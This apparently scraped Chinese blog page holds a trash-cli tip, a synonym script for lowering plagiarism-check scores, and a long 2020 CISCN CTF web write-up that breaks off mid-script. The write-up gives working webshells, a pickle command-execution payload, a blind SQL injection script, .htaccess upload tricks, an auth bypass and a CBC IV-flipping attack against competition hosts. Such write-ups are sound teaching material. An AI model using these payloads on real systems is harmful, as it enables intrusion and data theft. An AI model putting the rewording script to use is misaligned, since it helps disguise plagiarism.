<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-避免rm-rf-的悲惨命运" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" class="article-date">
  <time class="dt-published" datetime="2020-02-17T13:44:07.000Z" itemprop="datePublished">2020-02-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="避免rm-rf-的悲惨命运"><a href="#避免rm-rf-的悲惨命运" class="headerlink" title="避免rm -rf *的悲惨命运"></a>避免rm -rf *的悲惨命运</h1><p>今天又是悲惨的一天,没认真看,rm -rf *错地方了</p>
<p>为了再次避免悲惨命运</p>
<ol>
<li><p>还是不要老是用root用户了,创个日常的低权限用户,有必要时再登陆root</p>
</li>
<li><p>别用rm 啦,改用trash吧</p>
</li>
</ol>
<h2 id="安装trash-cli"><a href="#安装trash-cli" class="headerlink" title="安装trash-cli"></a>安装trash-cli</h2><p><code>apt-get install trash-cli</code></p>
<p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p>
<p><code>source ~/.zshrc</code> </p>
<h2 id="trash-cli-命令"><a href="#trash-cli-命令" class="headerlink" title="trash-cli 命令"></a>trash-cli 命令</h2><table>
<thead>
<tr>
<th>command</th>
<th>explain</th>
</tr>
</thead>
<tbody><tr>
<td>trash-put/trash</td>
<td>将文件或目录放进回收站</td>
</tr>
<tr>
<td>trash-empty</td>
<td>清空回收站</td>
</tr>
<tr>
<td>trash-list</td>
<td>列出回收站中的文件</td>
</tr>
<tr>
<td>restore-trash</td>
<td>还原回收站中的文件</td>
</tr>
<tr>
<td>trash-rm</td>
<td>删除回收站中的单个文件</td>
</tr>
</tbody></table>
<h2 id="垃圾站所在位置"><a href="#垃圾站所在位置" class="headerlink" title="垃圾站所在位置"></a>垃圾站所在位置</h2><p><code>~/.local/share/Trash/files</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/">https://www.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" data-id="ckmn5757y0092s1ni2tn8givq" data-title="避免rm -rf *的悲惨命运" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-勉强能用的论文降重" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" class="article-date">
  <time class="dt-published" datetime="2019-12-15T10:38:45.000Z" itemprop="datePublished">2019-12-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><pre><code class="python">import sys

if len(sys.argv) !=2:
    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])
    exit()

import synonyms


f=sys.argv[1]
s=&quot;&quot;
with open(f,&quot;r&quot;) as fl:
    s=fl.read()
resstr,stype=synonyms.seg(s)

with open(sys.argv[2],&quot;w&quot;) as fw:
    for i in resstr:
        if len(i)==1:
            fw.write(i)
        else :
            nearbystr,num=synonyms.nearby(i)

            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:
                print(nearbystr[1],num[1])
                fw.write(nearbystr[1])
            else :
                fw.write(i)

</code></pre>
<p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p>
<p>用完之后一定要自己校对一遍!!!不然…..</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/15/勉强能用的论文降重/">https://www.ccreater.top/2019/12/15/勉强能用的论文降重/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" data-id="ckmn5757n007us1ni58u3hjp6" data-title="勉强能用的论文降重" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020 ciscn 华东南 web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-CISCN-华东南赛区"><a href="#2020-CISCN-华东南赛区" class="headerlink" title="2020 CISCN 华东南赛区"></a>2020 CISCN 华东南赛区</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre><code>zip -r is useful, and don&#39;t forget /var/www/html/***********/cat.php</code></pre><p>访问<a href="http://www.zip拿到源码" target="_blank" rel="noopener">www.zip拿到源码</a></p>
<p>利用<code>$msg = sprintf($msg, $value);</code>打印文件上传位置<code>me0w_mE0w_miA0</code></p>
<p>访问<code>me0w_mE0w_miA0/cat.php</code>提示vim,拿到源码</p>
<p>cat.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
include(&#39;../waf.php&#39;);

session_start();
/*Login check*/
if(!$_SESSION[&#39;islogin&#39;])
{
    die(&#39;Who are you?&#39;);

}else{
    //class is waf~
    echo &quot;&lt;h4 align=&#39;center&#39;&gt;Hello,ctfer&lt;/h4&gt;&quot;;
    echo &quot;&lt;h4 align=&#39;center&#39;&gt;But I am only a little cat......really?&lt;/h4&gt;&quot;;
    echo &#39;&lt;br&gt;&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;../images/cat2.jpg&quot; align=&quot;center&quot; /&gt;&lt;/div&gt;&lt;/br&gt;&#39;;
    $a=new waf();
    spl_autoload_register();

    if(isset($_COOKIE[&quot;filenames&quot;]))
    {
        $a-&gt;data=$_COOKIE[&quot;filenames&quot;];
        $a-&gt;upload_check();
        echo &quot;&lt;h3 align=&#39;center&#39;&gt;The Winning Formula is complete!&lt;/h3&gt;&quot;;
        $filenames=unserialize($_COOKIE[&quot;filenames&quot;]);
    }else{
        $filenames=&#39;kee1ongz.meow&#39;;
        file_put_contents($filenames,&#39; Meow~meow,meow~&#39;);
    }
}

?&gt;
</code></pre>
<p>spl_autoload_register();没有任何参数的情况下调用spl_autoload();</p>
<blockquote>
<ul>
<li><code>class_name</code></li>
</ul>
<ul>
<li><code>file_extensions</code></li>
</ul>
<p>在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc       或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 </p>
</blockquote>
<p>上传fffffffffffuck.inc</p>
<pre><code>&lt;?php 
    class fffffffffffuck{
        public function __wakeup(){
            eval($_POST[1]);
        }
    }</code></pre><p>反序列化:<code>O:13:&quot;ffffffffffuck&quot;:0:[]</code>，将{}换为:<code>[]</code>虽然反序列化失败，但是还是调用了<code>__wakeup</code></p>
<p>拿到flag:<code>ciscn{keQXj78JHVUKjssqgD}</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示source.php,composer</p>
<pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
    if($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39;){
        $content = file_get_contents(&#39;php://filter/read=convert.base64-encode/resource=file:///var/www/html/excel.php&#39;);
        file_get_contents(&#39;http://&#39;.$_GET[&#39;ip&#39;].&#39;/?&#39;.$content);
    }
    else{
        die(&#39;only for localhost&#39;);
    }
?&gt;</code></pre>
<p>composer.json</p>
<pre><code>{
    &quot;require&quot;: {
        &quot;phpoffice/phpspreadsheet&quot;: &quot;1.5.0&quot;
    }
}</code></pre><p>hint给你excel.php的源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
require &#39;vendor/autoload.php&#39;;
$r = \PhpOffice\PhpSpreadsheet\IOFactory::createReader(&#39;Xlsx&#39;);
$r-&gt;setReadDataOnly(TRUE);
$fileInfo = $_FILES[&quot;filename&quot;];
$filePath = $fileInfo[&quot;tmp_name&quot;];
try {
$data = $r-&gt;load($filePath)-&gt;getSheet(0)-&gt;toArray(); 
}
catch (Exception $e) {
die(&#39;illegal xlsx file!&#39;);
}
$s = &#39;&#39;;
$s = $s.&#39;&lt;table&gt;&#39;;
foreach($data as $a)
    {
    $s = $s.&#39;&lt;tr&gt;&#39;;
    foreach($a as $i)
    {
        $s = $s.&quot;&lt;td style=\&quot;text-align:center\&quot;&gt;&lt;h2&gt;&quot;.$i.&quot;&lt;/h2&gt;&lt;/td&gt;&quot;;
    }
    $s = $s.&#39;&lt;/tr&gt;&#39;;
    }
$s = $s.&#39;&lt;/table&gt;&#39;;
stream_wrapper_unregister(&#39;php&#39;);
chdir(&#39;users/&#39;);
$fd = (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])?$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]);
mkdir($fd);
//data:
chdir($fd);
file_put_contents(&#39;profile&#39;,$s);
$f = basename(getcwd()).&#39;/profile&#39;;
//data:,/profile
chdir(&#39;..&#39;);
if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;)) {
    include($f);
}
else die(&#39;no!&#39;);
?&gt;

</code></pre>
<p>file_get_contents在处理data:,xxxxxx时会直接取xxxxxx<br>而include会包含文件名为data:,xxxxxx的文件</p>
<p>但是我们无法直接创建<code>data:</code>的文件夹</p>
<p>先用<code>./data:</code>创建<code>data:</code>文件夹</p>
<p>再用<code>data:</code>来绕过<code>if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;))</code></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a href="http://www.zip直接下载，翻源码审计。" target="_blank" rel="noopener">www.zip直接下载，翻源码审计。</a></p>
<p>登录这边看这login.php构造一下符合正则规则的参数就好了，登了取下sessionid</p>
<p>然后qr.php里，sql注入明显的点，直接拼接的，<code>$data</code>来自于扫描二维码得到的数据，二维码里是个json：<code>{&quot;id&quot;:&quot;xxxx&quot;}</code>。</p>
<pre><code class="php">$sql=&quot;insert into record(p_id, userid)values (&#39;&quot;.$data[&#39;id&#39;].&quot;&#39;,&#39;&quot;.$user-&gt;getCardID().&quot;&#39;);&quot;;</code></pre>
<p>写盲注脚本爆破一下：</p>
<pre><code class="python">import requests, time
import qrcode
from requests.adapters import HTTPAdapter

SQL = &quot;(select group_concat(flag) from flag)&quot;
GETCONTENT = &quot;&#39;or(if( ascii(substr((&quot; + SQL + &quot;),%d,1)) &lt;= %d, sleep(5), 0))or&#39;&quot;
GETLENGTH = &quot;&#39;or(if( length((&quot; + SQL + &quot;)) &lt;= %d, sleep(5), 0))or&#39;&quot;

THRESHOLD = 5
STRLEN = 32

session = requests.Session()

session.mount(&#39;http://&#39;, HTTPAdapter(max_retries=10))


def guess(payload, strpos=None):
    l = 0
    r = 255

    while l &lt; r:
        mid = (l+r)//2
        if strpos is None:
            sql = payload % (mid)
        else:
            sql = payload % (strpos, mid)

        if check(sql) == True:
            r = mid
            print(&#39;guess &lt;=&#39;, r)
        else:
            l = mid + 1
            print(&#39;guess &gt;&#39;, l)
    return l


def check(payload):

    qr = qrcode.make(&#39;{&quot;id&quot;:&quot;&#39; + payload + &#39;&quot;}&#39;)
    qr.save(&#39;qr.png&#39;)
    start = time.perf_counter()
    x = session.post(
        url=&#39;http://172.20.6.103/qr.php&#39;,
        cookies={
            &#39;PHPSESSID&#39;: &#39;fe940a8329992285f77487f96c575d29&#39;
        },
        files={
            &quot;file&quot;: open(&quot;qr.png&quot;, &quot;rb&quot;),
            &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,
            &quot;Content-Disposition&quot;: &quot;form-data&quot;,
            &quot;filename&quot;: &quot;qr.png&quot;
        },
        timeout=(2, 8)
    )
    end = time.perf_counter()
    print(payload, end-start)
    if end-start &gt; THRESHOLD:
        return True
    else:
        return False


def getlength():
    global STRLEN
    STRLEN = guess(GETLENGTH)
    print(&#39;LEN:&#39;, STRLEN)


def getcontent():
    content = &#39;&#39;
    for strpos in range(1, STRLEN+1):
        ch = guess(GETCONTENT, strpos)

        content += chr(ch)
        print(&#39;CHR:&#39;, chr(ch), &#39;CONTENT:&#39;, content)


if __name__ == &#39;__main__&#39;:
    getlength()
    getcontent()</code></pre>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>&lt;?php
class GetPass
{}
class Upload
{}
$y1ng = new GetPass;
$y1ng-&gt;abandon = new GetPass;
$y1ng-&gt;abandon-&gt;abandon =new Upload;
$y1ng-&gt;abandon-&gt;boring =&quot;1&quot;;
$y1ng-&gt;abandon-&gt;code =&quot;1&quot;;

$y1ng-&gt;boring = &#39;read&#39;;
$y1ng-&gt;code = &#39;hidden&#39;;

$c = new GetPass;
$c-&gt;abandon = new GetPass;
$c-&gt;abandon-&gt;abandon =new Upload;
$c-&gt;abandon-&gt;boring =&quot;1&quot;;
$c-&gt;abandon-&gt;code =&quot;1&quot;;

$c-&gt;boring = &#39;read&#39;;
$c-&gt;code = this;

$ser = serialize([$y1ng,$c]);
var_dump(urlencode($ser));</code></pre><p>拿到pass=ob_end_clean_is_surplus</p>
<p>文件上传与网上某题相近</p>
<p>exp.py</p>
<pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;

def generate_php_file(filename, script):
    phpfile = open(filename, &#39;wb&#39;) 

    phpfile.write(script.encode(&#39;utf-16be&#39;))
    phpfile.write(SIZE_HEADER)

    phpfile.close()

def generate_htacess():
    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)

    htaccess.write(SIZE_HEADER)
    htaccess.write(b&#39;AddType application/x-httpd-php .fuck\n&#39;)
    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)
    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)
    htaccess.write(b&#39;php_value display_errors 1\n&#39;)

    htaccess.close()
generate_htacess()
generate_php_file(&quot;webshell.fuck&quot;, &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;)
</code></pre>
<p>分别上传webshell.fuck,还有.htaccess拿到flag</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><pre><code>ccopy_reg
_reconstructor
p0
(c__main__
webSite
p1
c__builtin__
object
p2
Ntp3
Rp4
(dp5
Vname
p6
c__builtin__
getattr
(cos
popen
(S&#39;dir&#39;
tRS&#39;read&#39;
tR(NtRp7
sVdescribe
p8
V2
p9
sb.</code></pre><p>提权没环境复现</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><pre><code class="python">import requests
url=&quot;http://172.20.6.106:80/&quot;
burp0_url = &quot;http://172.20.6.106:80/index.php&quot;
burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://172.20.6.106&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundary6ssqFd6DiMBBDuHJ&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://172.20.6.106/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;x-forwarded-for&quot;: &quot;127.0.0.1&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = &quot;------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;htaccess\&quot;\r\nContent-Type: application/octet-stream\r\n\r\nSetHandler application/x-httpd-php\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n.htaccess\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ--\r\n&quot;
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://172.20.6.106&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundarywAeLpgB3HhSWqVLj&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://172.20.6.106/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;x-forwarded-for&quot;: &quot;127.0.0.1&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = &quot;------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;shell1.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\neval($_POST[&#39;a&#39;]);\n?&gt;\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n2.jpg\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj--\r\n&quot;
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


burp0_data={&quot;a&quot;:&quot;system(&#39;cat /flag.txt&#39;);&quot;}
r=requests.post(url+&quot;upload/2.jpg&quot;, data=burp0_data)
print(r.text)</code></pre>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>浏览一遍代码后发现一个弱类型比较</p>
<pre><code class="php">function getUser()
{

    if (!isset($_SESSION[&quot;token&quot;])) {
        return -1;  //not login
    } else if ($_SESSION[&quot;token&quot;] == &quot;0&quot;) {
        return 0;   //Administrator//0e绕过
    } else {
        $key = base64_decode($_SESSION[&quot;token&quot;]);
        $user = explode(&quot;|&quot;, $key)[0]; //user
        if (!$user) {
            return -1;
        }
        return $user;
    }
}
</code></pre>
<p>如果我们能令token以0e[0-9]+的格式的话，就可以绕过身份验证机制</p>
<p>而生成token的代码为：</p>
<pre><code class="php">function setUser($username, $password)
{
    $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
    if ($username == &#39;admin&#39;) {
        if ($ip == &quot;::1&quot; || $ip == &quot;127.0.0.1&quot;){
            $_SESSION[&quot;token&quot;] = 0;     //Administrator
        }else{
            die(&#39;修罗！隐忍！！！&#39;);
        }
    } else {
        $key = $username . &quot;|&quot; . $password;
        $_SESSION[&quot;token&quot;] = base64_encode($key);
    }
}</code></pre>
<p>因为0e[0-9]+是在base64中的所以我们构造：<code>username=%D1%EDv%EF%BE&amp;password=%D7m%F8</code></p>
<p>至此获得admin权限</p>
<p>upload处有个任意文件上传，但是我们不知道admin的上传目录，我们不得不进行sql注入</p>
<p>notes.php处有个神奇的todo:</p>
<pre><code class="php">if (isset($_POST[&#39;contents&#39;])) {
    $data = getCache();
    if ($data &amp;&amp; $data-&gt;contents == $_POST[&#39;contents&#39;]) {
        $username = $data-&gt;username;
        $contents = $data-&gt;contents;

    } else {
        $contents = $_POST[&#39;contents&#39;];
    }
    if (isset($_POST[&#39;cache&#39;])) {
        setCache($username, $contents);
        echo &quot;&lt;script&gt;alert(&#39;缓存成功&#39;);location.href=&#39;index.php&#39;&lt;/script&gt;&quot;;
    } else {
        setcookie(&#39;cache&#39;);
        $sql = &quot;INSERT INTO notes (uid, contents, time) VALUES ((select id from users where username = &#39;${username}&#39;), &#39;${contents}&#39;, localtime())&quot;;
        echo $sql;
        if ($conn-&gt;query($sql) === TRUE) {
            echo &quot;&lt;script&gt;alert(&#39;提交成功&#39;);location.href=&#39;index.php&#39;&lt;/script&gt;&quot;;
        } else {
            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;
            //TODO:删掉
        }
    }
}</code></pre>
<p>如果我们能控制$data-&gt;contents == $_POST[‘contents’]，且可以控制<code>$data-&gt;username</code>出现引号逃出引号的包围，就可以进行sql注入了。</p>
<p>而我们的缓存的加密函数是：</p>
<pre><code class="php">class CBCCrypt {
    private $iv;

    private $encryptKey;

    public function __construct()
    {
        $this-&gt;iv = &quot;cbcisfunsoisbase&quot;;
        $this-&gt;encryptKey =  file_get_contents(&quot;secret.txt&quot;);
    }

    public function encrypt($encryptStr) {
        $iv = $this-&gt;iv;
        $encryptKey = $this-&gt;encryptKey;

        $encrypted=openssl_encrypt($encryptStr, &#39;aes-128-cbc&#39;, $encryptKey, true, $iv);

        return base64_encode($iv.$encrypted);

    }

    public function decrypt($encryptStr) {
        $iv = substr(base64_decode($encryptStr),0,16);
        $encryptKey = $this-&gt;encryptKey;
        $encrypted = substr(base64_decode($encryptStr),16);
        $decrypted = openssl_decrypt($encrypted, &#39;aes-128-cbc&#39;, $encryptKey, true, $iv);
        echo openssl_error_string();

        return $decrypted;
    }
}</code></pre>
<p>其中$iv是受到我们控制的</p>
<p><img src="https://image.3001.net/images/20180228/15198072135832.png!small" alt="image12048"></p>
<p>根据cbc加密的原理我们可以知道，通过修改iv从而修改初始的16个字符串</p>
<p>爆破合适iv的脚本:</p>
<pre><code class="php">&lt;?php

function strxor($str1,$str2){
    $res=&quot;&quot;;
    if(strlen($str1)!==strlen($str2))
        return &quot;&quot;;
    for($i=0;$i&lt;strlen($str1);$i++){
        $res.=chr(ord($str1[$i])^ord($str2[$i]));
    }
    return $res;

}
$enc=urldecode(&quot;Y2JjaXNmdW5zb2lzYmFzZUDBRfKeIBJYWfSM2WOSqNOLdJ7UM1Nq%2B9zuKSrAr7O8%2B9AtpndZ00OlTIF0qmDsWw%3D%3D&quot;);
$cipher = substr($enc,16,16);
$message = substr(&#39;{&quot;username&quot;:&quot;fucker&quot;,&quot;contents&quot;:&quot;fucker&quot;}&#39;,0,16);
$iv = &quot;cbcisfunsoisbase&quot;;
$before_xor=strxor($message,$iv);
for($i=0;$i&lt;256;$i++){
    $iv = &quot;cbcisfunsoisbas&quot;.chr($i);
    $result = strxor($iv,$before_xor);
    if(strpos($result,&quot;&#39;&quot;)!==FALSE){
        echo urlencode($iv);
        echo &quot;\n&quot;.$result;
    }
}</code></pre>
<pre><code class="python">import requests
import base64
import urllib
import random
session = requests.session()


def reg(session,username):
    burp0_url = &quot;http://100.100.1.5:80/ctf/register.php&quot;
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/register.html&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;username&quot;: &quot;fuc&quot;+username, &quot;password&quot;: &quot;fucker&quot;, &quot;submit&quot;: &quot;\xe6\xb3\xa8\xe5\x86\x8c&quot;}
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if &quot;注册成功&quot; in r.text:
        return True
    else:
        return False

def cache(session):
    burp0_url = &quot;http://100.100.1.5:80/ctf/notes.php&quot;
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;contents&quot;: &quot;fffffffffffffffffffffffffffffffffff&quot;, &quot;cache&quot;: &#39;&#39;}
